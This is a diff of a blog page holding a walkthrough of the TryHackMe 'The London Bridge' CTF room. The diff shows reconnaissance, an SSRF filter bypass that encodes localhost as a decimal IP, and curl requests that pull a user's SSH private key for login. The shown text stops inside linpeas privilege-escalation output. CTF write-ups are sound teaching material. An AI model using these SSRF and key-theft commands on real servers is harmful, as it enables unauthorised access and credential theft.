+   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
+   <path d="M16 3v4"></path>
+   <path d="M8 3v4"></path>
+   <path d="M4 11h16"></path>
+   <path d="M11 15h1"></path>
+   <path d="M12 15v3"></path>
+</svg>
+
+    </i>
+    <time datetime="2024-10-02T23:46:18&#43;05:30">
+      2024-10-02
+    </time>
+  </div>
+
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M6.5 7h11"></path>
+   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
+   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
+</svg>
+
+    </i>
+    <span>
+      11 minutes to read
+    </span>
+  </div>
+</div>
+
+
+      
+        
+        <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
+          <h2>Table of Contents</h2>
+          <aside><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#shell-as-beth">Shell as beth</a>
+      <ul>
+        <li><a href="#rustscan">Rustscan</a></li>
+        <li><a href="#web-server-port8080">Web server (port:8080)</a></li>
+        <li><a href="#ffuf">ffuf</a></li>
+        <li><a href="#ssrf">SSRF</a></li>
+        <li><a href="#extracting-private-key">Extracting private key</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#linpeas">linpeas</a></li>
+        <li><a href="#cve-2018-18955">CVE-2018-18955</a></li>
+      </ul>
+    </li>
+    <li><a href="#finding-charles-password">Finding Charles Password</a>
+      <ul>
+        <li><a href="#firefox_decrypt">firefox_decrypt</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></aside>
+        </section>
+        
+      
+
+      <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
+        <h2 id="introduction">Introduction</h2>
+<p>Detailed walkthroughs for <a href="https://tryhackme.com/r/room/thelondonbridge" target="_blank" rel="noopener">The London Bridge</a>
+ CTF challenges on <a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a>
+.</p>
+<h2 id="shell-as-beth">Shell as beth</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.72.132 londonbridge.thm&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>Mappped the ip to domain <code>londonbridge.thm</code>.</p>
+<h3 id="rustscan">Rustscan</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ rustscan -a londonbridge.thm -- -sC -sV
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE    REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh        syn-ack ttl <span class="m">60</span> OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx+17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 <span class="nv">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1
+</span></span><span class="line"><span class="cl">8080/tcp open  http-proxy syn-ack ttl <span class="m">60</span> gunicorn
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: gunicorn
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: gunicorn
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Mon, <span class="m">30</span> Sep <span class="m">2024</span> 16:13:38 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">2682</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Explore London&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;style&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     body <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     font-family: Arial, sans-serif<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     margin: 0<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     padding: 0<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     background-color: <span class="c1">#f2f2f2;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     header <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     background-color: <span class="c1">#333;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     color: <span class="c1">#fff;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     padding: 10px 20px<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     text-align: center<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     background-color: <span class="c1">#444;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     color: <span class="c1">#fff;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     padding: 10px 20px<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     text-align: center<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     color: <span class="c1">#fff;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     text-decoration: none<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     margin: <span class="m">0</span> 10p
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: gunicorn
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Mon, <span class="m">30</span> Sep <span class="m">2024</span> 16:13:39 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Allow: HEAD, OPTIONS, GET
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Content-Length: <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: HEAD OPTIONS GET
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Explore London
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>From the above result we know,</p>
+<ol>
+<li>2 open ports are available <code>port 22 (ssh)</code> and <code>port 8080 (web server)</code>.</li>
+<li>SSH version: <code>OpenSSH 7.6p1 Ubuntu 4ubuntu0.7</code></li>
+<li>Web server:
+<ul>
+<li>Server: <code>gunicorn</code></li>
+<li>Methods Allowed: <code>HEAD, OPTIONS, GET</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="web-server-port8080">Web server (port:8080)</h3>
+<p>
+
+
+
+<figure>
+    <img src="/posts/thelondonbridge/1.png" title="Home Page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Home Page</strong>
+    </figcaption>  
+</figure>
+
+Here is the Welcome page of the web server.</p>
+<p>
+
+
+
+<figure>
+    <img src="/posts/thelondonbridge/2.png" title="Gallery" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Gallery</strong>
+    </figcaption>  
+</figure>
+
+We have a gallery page, where we can upload our photos(images) here, it will immediately reflect on the page. Uploading files other than images giving <code>Uploaded file is not image</code> error.</p>
+<p>
+
+
+
+<figure>
+    <img src="/posts/thelondonbridge/3.png" title="Contact page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Contact page</strong>
+    </figcaption>  
+</figure>
+
+In contact page, we can leave our feedback.</p>
+<p>
+
+
+
+<figure>
+    <img src="/posts/thelondonbridge/4.png" title="Feedback page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Feedback page</strong>
+    </figcaption>  
+</figure>
+
+Here is the feedback page after giving feedback in contact page.</p>
+<h3 id="ffuf">ffuf</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -u http://londonbridge.thm:8080/FUZZ -w /usr/share/wordlists/dirb/big.txt
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">contact                 <span class="o">[</span>Status: 200, Size: 1703, Words: 549, Lines: 60, Duration: 161ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">feedback                <span class="o">[</span>Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 155ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">gallery                 <span class="o">[</span>Status: 200, Size: 1722, Words: 484, Lines: 55, Duration: 376ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">upload                  <span class="o">[</span>Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 152ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">view_image              <span class="o">[</span>Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 152ms<span class="o">]</span>
+</span></span></code></pre></div><p>Got some interesting result from ffuf. From the above results we have visited app pages expect one <code>view_image</code>.</p>
+<p>
+
+
+
+<figure>
+    <img src="/posts/thelondonbridge/5.png" title="BurpSuite: /view_image" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite: /view_image</strong>
+    </figcaption>  
+</figure>
+
+While checking for <code>/view_image</code> we are getting <code>Method Not Allowed</code> error. Now lets change the method type to <code>POST</code>.</p>
+<p>
+
+
+
+<figure>
+    <img src="/posts/thelondonbridge/6.png" title="View Image page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>View Image page</strong>
+    </figcaption>  
+</figure>
+
+By changing the request <code>from GET to POST</code>, we are able to access <code>/view_image</code> page where we can give <code>image url as input</code>.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thelondonbridge/7.png" title="Using Image url" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Using Image url</strong>
+    </figcaption>  
+</figure>
+
+<p>
+
+
+
+<figure>
+    <img src="/posts/thelondonbridge/8.png" title="BurpSuite using image url" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite using image url</strong>
+    </figcaption>  
+</figure>
+
+If we gave image url, this page is loading and showing the image on the same page. Lets try to use this for reverse shell.</p>
+<p>Tried uploading multiple payloads using url, but no exploits worked. It&rsquo;s because directly image url is added in image tag, without backend processing. Lets look into hint provided.</p>
+<pre><code># Hint
 Check for other parameters that may been left over during the development phase. If one list doesn't work, try another common one.
-</code></pre><p>From the above hint we need to try fuzzing for another parameter. The parameter which we already have is <code>image_url</code>. We need to find the parameter which is missed in development phase.</p><h3 id=ssrf>SSRF</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -c -X POST -u http://londonbridge.thm:8080/view_image -d <span class=s2>&#34;FUZZ=http://</span><span class=nv>$attacker_ip</span><span class=s2>/Exif.png&#34;</span> -H <span class=s2>&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -w /usr/share/wordlists/dirb/big.txt -fs <span class=m>823</span>
-</span></span><span class=line><span class=cl>________________________________________________
-</span></span><span class=line><span class=cl>www                     <span class=o>[</span>Status: 200, Size: 194199, Words: 424, Lines: 357, Duration: 2264ms<span class=o>]</span>
-</span></span></code></pre></div><p>When using <code>ffuf</code> to fuzz the paramater we got the result <code>www</code>. Lets test the parameter www.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X POST  http://londonbridge.thm:8080/view_image -d <span class=s2>&#34;www=http://127.0.0.1&#34;</span> -H <span class=s2>&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>
-</span></span><span class=line><span class=cl>&lt;!DOCTYPE HTML PUBLIC <span class=s2>&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
-</span></span><span class=line><span class=cl>&lt;title&gt;403 Forbidden&lt;/title&gt;
-</span></span><span class=line><span class=cl>&lt;h1&gt;Forbidden&lt;/h1&gt;
-</span></span><span class=line><span class=cl>&lt;p&gt;You don<span class=p>&amp;</span><span class=c1>#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.&lt;/p&gt;</span>
-</span></span></code></pre></div><p>When trying to access localhost, we encountered the error <code>You don’t have permission to access the requested resource</code>. This means that we simply do not have the necessary permissions. If our access were upgraded, we could access the resources on localhost. Additionally, we discovered an <code>SSRF</code> vulnerability.</p><p>Lets try to bypass the access issue or input filter using <a href=https://portswigger.net/web-security/ssrf#ssrf-with-blacklist-based-input-filters target=_blank rel=noopener>SSRF with blacklist-based input filters</a>
-.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl -X POST http://londonbridge.thm:8080/view_image -d <span class=s2>&#34;www=http://2130706433&#34;</span> -H <span class=s2>&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>                  
-</span></span><span class=line><span class=cl>&lt;HTML&gt;
-</span></span><span class=line><span class=cl>&lt;body <span class=nv>bgcolor</span><span class=o>=</span><span class=s2>&#34;gray&#34;</span>&gt;
-</span></span><span class=line><span class=cl>&lt;h1&gt;London brigde&lt;/h1&gt;
-</span></span><span class=line><span class=cl>&lt;img <span class=nv>height</span><span class=o>=</span>400px <span class=nv>width</span><span class=o>=</span>600px <span class=nv>src</span> <span class=o>=</span><span class=s2>&#34;static/1.webp&#34;</span>&gt;&lt;br&gt;
-</span></span><span class=line><span class=cl>&lt;font <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;monotype corsiva&#34;</span> <span class=nv>size</span><span class=o>=</span>18&gt;London Bridge is falling down&lt;br&gt;
-</span></span><span class=line><span class=cl>    Falling down, falling down&lt;br&gt;
-</span></span><span class=line><span class=cl>    London Bridge is falling down&lt;br&gt;
-</span></span><span class=line><span class=cl>    My fair lady&lt;br&gt;
-</span></span><span class=line><span class=cl>    Build it up with iron bars&lt;br&gt;
-</span></span><span class=line><span class=cl>    Iron bars, iron bars&lt;br&gt;
-</span></span><span class=line><span class=cl>    Build it up with iron bars&lt;br&gt;
-</span></span><span class=line><span class=cl>    My fair lady&lt;br&gt;
-</span></span><span class=line><span class=cl>    Iron bars will bend and break&lt;br&gt;
-</span></span><span class=line><span class=cl>    Bend and break, bend and break&lt;br&gt;
-</span></span><span class=line><span class=cl>    Iron bars will bend and break&lt;br&gt;
-</span></span><span class=line><span class=cl>    My fair lady&lt;br&gt;
-</span></span><span class=line><span class=cl>&lt;img <span class=nv>height</span><span class=o>=</span>400px <span class=nv>width</span><span class=o>=</span>600px <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;static/2.webp&#34;</span>&gt;&lt;br&gt;
-</span></span><span class=line><span class=cl>&lt;font <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;monotype corsiva&#34;</span> <span class=nv>size</span><span class=o>=</span>18&gt;Build it up with gold and silver&lt;br&gt;
-</span></span><span class=line><span class=cl>    Gold and silver, gold and silver&lt;br&gt;
-</span></span><span class=line><span class=cl>    Build it up with gold and silver&lt;br&gt;
-</span></span><span class=line><span class=cl>    My fair lady&lt;br&gt;
-</span></span><span class=line><span class=cl>    Gold and silver we<span class=s1>&#39;ve not got&lt;br&gt;
-</span></span></span><span class=line><span class=cl><span class=s1>    We&#39;</span>ve not got, we<span class=s1>&#39;ve not got&lt;br&gt;
-</span></span></span><span class=line><span class=cl><span class=s1>    Gold and silver we&#39;</span>ve not got&lt;br&gt;
-</span></span><span class=line><span class=cl>    My fair lady&lt;br&gt;
-</span></span><span class=line><span class=cl>&lt;img <span class=nv>height</span><span class=o>=</span>400px <span class=nv>width</span><span class=o>=</span>600px <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;static/3.jpg&#34;</span>&gt;&lt;br&gt;
-</span></span><span class=line><span class=cl>    London Bridge is falling down&lt;br&gt;
-</span></span><span class=line><span class=cl>    Falling down, falling down&lt;br&gt;
-</span></span><span class=line><span class=cl>    London Bridge is falling down&lt;br&gt;
-</span></span><span class=line><span class=cl>    My fair lady&lt;br&gt;
-</span></span><span class=line><span class=cl>    London Bridge is falling down&lt;br&gt;
-</span></span><span class=line><span class=cl>    Falling down, falling down&lt;br&gt;
-</span></span><span class=line><span class=cl>    London Bridge is falling down&lt;br&gt;
-</span></span><span class=line><span class=cl>    My fair beth&lt;/font&gt;
-</span></span><span class=line><span class=cl>&lt;/body&gt;
-</span></span><span class=line><span class=cl>&lt;/HTML&gt;
-</span></span></code></pre></div><p>We got a positive response from the server. Lets try to check the <code>ports opened in localhost</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ffuf -c -X POST -u http://londonbridge.thm:8080/view_image -d <span class=s2>&#34;www=http://2130706433:FUZZ&#34;</span> -H <span class=s2>&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -w 65536_ports.txt -fc <span class=m>500</span>
-</span></span><span class=line><span class=cl>________________________________________________
-</span></span><span class=line><span class=cl><span class=m>80</span>                      <span class=o>[</span>Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 171ms<span class=o>]</span>
-</span></span><span class=line><span class=cl><span class=m>8080</span>                    <span class=o>[</span>Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 276ms<span class=o>]</span>
-</span></span></code></pre></div><p>We got 2 results, where <code>port 8080</code> is accessible from internet and <code>port 80</code> is only for localhost. Lets try to fuzz for files/directories in port 80.</p><h3 id=extracting-private-key>Extracting private key</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ffuf -c -X POST -u http://londonbridge.thm:8080/view_image -d <span class=s2>&#34;www=http://2130706433/FUZZ&#34;</span> -H <span class=s2>&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -w /usr/share/wordlists/dirb/big.txt -fs <span class=m>469</span>
-</span></span><span class=line><span class=cl>________________________________________________
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>.ssh                    <span class=o>[</span>Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 164ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>.bashrc                 <span class=o>[</span>Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 182ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>.profile                <span class=o>[</span>Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 187ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>.bash_history           <span class=o>[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 215ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>static                  <span class=o>[</span>Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 262ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>templates               <span class=o>[</span>Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 162ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>uploads                 <span class=o>[</span>Status: 200, Size: 630, Words: 23, Lines: 22, Duration: 254ms<span class=o>]</span>
-</span></span></code></pre></div><p>While fuzzing we gots some results which we can find in home directory of the user. Here interesting result is <code>.ssh</code> where we will have the <code>authorized_keys</code> and <code>ssh private keys</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl -X POST http://londonbridge.thm:8080/view_image -H <span class=s2>&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -d <span class=s2>&#34;www=http://2130706433/.ssh/authorized_keys&#34;</span>
-</span></span><span class=line><span class=cl>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
-</span></span></code></pre></div><p>By checking the <code>authorized_keys</code> this should be the home directory of user <code>beth</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X POST http://londonbridge.thm:8080/view_image -d <span class=s2>&#34;www=http://2130706433/.ssh/id_rsa&#34;</span> -H <span class=s2>&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> &gt; id_rsa
-</span></span><span class=line><span class=cl>chmod <span class=m>400</span> id_rsa
-</span></span><span class=line><span class=cl>ssh beth@londonbridge.thm -i id_rsa
-</span></span></code></pre></div><p>We also got <code>id_rsa(ssh private key)</code>. Lets use it to get reverse shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>beth@london:~$ cat /home/beth/__pycache__/user.txt
-</span></span><span class=line><span class=cl>THM<span class=o>{</span>REDACTED<span class=o>}</span>
-</span></span></code></pre></div><p>We got our first flag here.</p><h2 id=privilege-escalation>Privilege Escalation</h2><h3 id=linpeas>linpeas</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>beth@london:~$ cat /etc/passwd <span class=p>|</span> grep bash
-</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
-</span></span><span class=line><span class=cl>beth:x:1000:1000:Elizabeth,,,:/home/beth:/bin/bash
-</span></span><span class=line><span class=cl>charles:x:1001:1001:King Charles,,,:/home/charles:/bin/bash
-</span></span></code></pre></div><p>There are 3 users in system <code>beth</code>, <code>charles</code> and <code>root</code> user. Lets try to escalate our privileges.</p><p>lets use <a href=https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh target=_blank rel=noopener>linpeas.sh</a>
-for getting privilege escalation vector.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>╔══════════╣ Sudo version
-</span></span><span class=line><span class=cl>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                               
-</span></span><span class=line><span class=cl>Sudo version 1.8.21p2
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>╔══════════╣ PATH
-</span></span><span class=line><span class=cl>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                       
-</span></span><span class=line><span class=cl>/home/beth/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>╔══════════╣ Executing Linux Exploit Suggester
-</span></span><span class=line><span class=cl>╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                            
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2021-3156<span class=o>]</span> sudo Baron Samedit                                                                                                                        
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
-</span></span><span class=line><span class=cl>   Exposure: probable
-</span></span><span class=line><span class=cl>   Tags: <span class=nv>mint</span><span class=o>=</span>19,<span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=</span>18<span class=p>|</span><span class=m>20</span> <span class=o>]</span>, <span class=nv>debian</span><span class=o>=</span><span class=m>10</span>
-</span></span><span class=line><span class=cl>   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2021-3156<span class=o>]</span> sudo Baron Samedit <span class=m>2</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
-</span></span><span class=line><span class=cl>   Exposure: probable
-</span></span><span class=line><span class=cl>   Tags: <span class=nv>centos</span><span class=o>=</span>6<span class=p>|</span>7<span class=p>|</span>8,<span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=</span>14<span class=p>|</span>16<span class=p>|</span>17<span class=p>|</span>18<span class=p>|</span>19<span class=p>|</span><span class=m>20</span> <span class=o>]</span>, <span class=nv>debian</span><span class=o>=</span>9<span class=p>|</span><span class=m>10</span>
-</span></span><span class=line><span class=cl>   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2018-18955<span class=o>]</span> subuid_shell
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span class=o>=</span><span class=m>1712</span>
-</span></span><span class=line><span class=cl>   Exposure: probable
